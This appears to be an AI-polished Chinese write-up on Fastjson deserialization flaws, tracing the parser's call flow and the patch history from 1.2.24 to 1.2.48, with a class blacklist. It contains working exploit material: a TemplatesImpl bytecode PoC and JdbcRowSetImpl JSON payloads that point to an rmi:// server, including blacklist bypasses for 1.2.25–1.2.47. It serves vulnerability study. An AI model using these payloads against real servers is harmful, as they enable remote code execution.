以下是优化后的文本，旨在提高其清晰度、连贯性和专业性：

---

### Fastjson反序列化漏洞分析与修复历程

#### 漏洞PoC示例
```java
public class Poc {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {evil}); // evil为恶意字节码
        setFieldValue(obj, "_name", "a.b");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(obj, "_outputProperties", new HashMap<>());
    }
}
```

- `_tfactory` 可以传入 `new TransformerFactoryImpl()`。如果为空，则会根据类属性自动创建 `TransformerFactoryImpl` 实例。
- 使用 `fastjson/serializer` 进行序列化时，可以不传入 `_tfactory`。

#### fastjson反序列化调用流程
1. **入口方法**：`JSON.parseObject()`
2. **解析对象**：`DefaultJSONParser.parseObject()`
3. **类型检测**：若 `key == JSON.DEFAULT_TYPE_KEY` 且未开启 `Feature.DisableSpecialKeyDetect`，则通过 `loadClass` 加载类对象。
4. **获取反序列化器**：`ParserConfig.getDeserializer()` 经过一系列判断后，创建 `JavaBeanDeserializer`。
5. **属性匹配**：`JavaBeanDeserializer.parseField()` 利用 `smartMatch` 对传入的属性进行模糊匹配，并调用反射触发相应方法。

#### fastjson 1.2.24 版本修复
- 在 `DefaultJSONParser.parseObject` 中，将加载类的方法 `TypeUtils.loadClass` 替换为 `this.config.checkAutoType()`。
- 增加了白名单和黑名单机制，禁止以下类的加载：
  - `bsh`, `com.mchange`, `com.sun.*`, `java.lang.Thread`, `java.net.Socket`, `java.rmi.*`, `javax.xml.*`, `org.apache.bcel.*`, `org.apache.commons.beanutils.*`, `org.apache.commons.collections.Transformer`, `org.apache.commons.collections.functors.*`, `org.apache.commons.collections4.comparators.*`, `org.apache.commons.fileupload.*`, `org.apache.myfaces.context.servlet.*`, `org.apache.tomcat.*`, `org.apache.wicket.util.*`, `org.codehaus.groovy.runtime.*`, `org.hibernate.*`, `org.jboss.*`, `org.mozilla.javascript.*`, `org.python.core.*`, `org.springframework.*`

#### fastjson jdbcRowSetImpl 链
- **TemplatesImpl 链**：
  - 优点：在不出网的情况下可以直接进行盲打（配合时延命令来判断命令是否执行成功）。
  - 缺点：版本限制（从 1.2.22 起才有 `SupportNonPublicField` 特性），并且需要特定语句触发，在使用 `parseObject` 时必须使用 `JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)`。

- **JdbcRowSetImpl 链**：
  - 优点：利用范围更广，触发更为容易。
  - 缺点：当 fastjson 不出网时该方法基本不可行（高版本 JDK 中 `codebase` 默认为 `true`，只能加载受信任的地址）。

#### fastjson 后续修复
1. **自 1.2.25 起**：
   - `autotype` 默认关闭。
   - 增加 `checkAutoType` 方法，扩充黑名单并增加白名单机制。

2. **1.2.25-1.2.41 版本**：
   - 由于 `autotype` 默认关闭，在 PoC 之前需开启 `autotype`：
     ```java
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
     ```
   - 新增的 `checkAutoType` 方法对传入类进行了过滤，开头为 `[` 或结尾为 `;` 的类会被去除。
   - PoC 示例：
     ```json
     {"@type":"[com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1099/refObj", "autoCommit":true}
     ```

3. **1.2.42 版本**：
   - 将 `checkAutoType` 换为哈希校验，对类的第一位和最后一位进行哈希（第一位为 `L`，最后一位为 `;`）。
   - 黑名单哈希表对比：
     ```json
     {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://127.0.0.1:1099/refObj", "autoCommit":true}
     ```

4. **1.2.43 版本**：
   - 对双写进行了过滤。

5. **1.2.45 版本**：
   - 扩充黑名单。

6. **1.2.25-1.2.47 版本通杀 PoC**：
   ```json
   {
       "a": {
           "@type": "java.lang.Class",
           "val": "com.sun.rowset.JdbcRowSetImpl"
       },
       "b": {
           "@type": "com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName": "rmi://localhost:1099/refObj",
           "autoCommit": true
       }
   }
   ```
   - 该 PoC 无视 `checkAutoType`，绕过了黑名单检测。

7. **1.2.48 版本**：
   - 将 `cache` 默认设置为 `false`。

---

希望这些改进能帮助你更好地理解和处理相关问题。